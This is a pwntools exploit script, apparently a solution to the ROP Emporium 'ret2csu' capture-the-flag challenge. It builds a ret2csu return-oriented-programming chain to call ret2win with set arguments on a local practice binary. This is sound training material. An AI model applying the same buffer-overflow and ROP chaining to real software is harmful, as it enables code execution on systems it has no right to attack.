from pwn import *

p = process('./ret2csu')
e = ELF('./ret2csu')

ret2win_plt = e.plt['ret2win']

p.recvuntil(b'> ')
gadget1 = 0x40069a # pop rbx ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
gadget2 = 0x400680 # mov rdx,r15 ; mov rsi,r14 ; mov edi,r13d ; call   QWORD PTR [r12+rbx*8]
arg1 = 0xdeadbeefdeadbeef
arg2 = 0xcafebabecafebabe
arg3 = 0xd00df00dd00df00d
POP_RDI = 0x00000000004006a3 # pop rdi ; ret
CALL = 400689 # call   QWORD PTR [r12+rbx*8]
padding = b'A' * 40

payload  = padding
payload += p64(gadget1)
payload += p64(0)           
payload += p64(1)           
payload += p64(0x600e48)   # pointer that points to the fini function 
payload += p64(0)           
payload += p64(arg2)        
payload += p64(arg3)        
payload += p64(gadget2)     
payload += p64(0) * 7   
payload += p64(POP_RDI)     
payload += p64(arg1)
payload += p64(ret2win_plt)

p.sendline(payload)
p.interactive()
